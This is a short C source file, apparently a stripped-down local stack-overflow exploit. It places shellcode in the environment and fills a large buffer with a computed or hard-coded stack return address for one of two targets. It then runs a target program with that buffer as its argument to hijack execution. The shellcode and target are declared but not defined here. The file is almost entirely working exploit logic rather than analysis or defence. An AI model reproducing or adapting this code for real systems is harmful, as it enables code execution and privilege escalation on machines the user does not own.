
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;
 char* FUN ;
 int atoi (char*) ;
 int execve (char*,char**,char**) ;
 int exit (int ) ;
 int perror (char*) ;
 char* shellcode ;
 int strlen (char*) ;
 int usage () ;

int main(int argc, char **argv) {

    char buffer[9000];
    int x,target;
    char *env[2];
    char *args[24];

    unsigned long ret = 0xbffffffa - strlen(shellcode) - strlen(FUN);

    int *ptr = (int *)(buffer);
    if (argc != 2) {
       usage();
       exit(0);
       }

    target = atoi(argv[1]);

   if (target == 0) {
    for (x=0; x<9000 ; x+=4)
      *ptr++ = (ret + 1);
   }

   if (target == 1) {
     for (x=0; x<3500 ; x+=4)
          *ptr++ = 0xbfbffe48;
   }


    env[0] = shellcode;
    env[1] = ((void*)0);


    args[0] = FUN;
    args[1] = buffer;
    args[2] = ((void*)0);


    execve (args[0], args, env);
    perror ("execve");
}
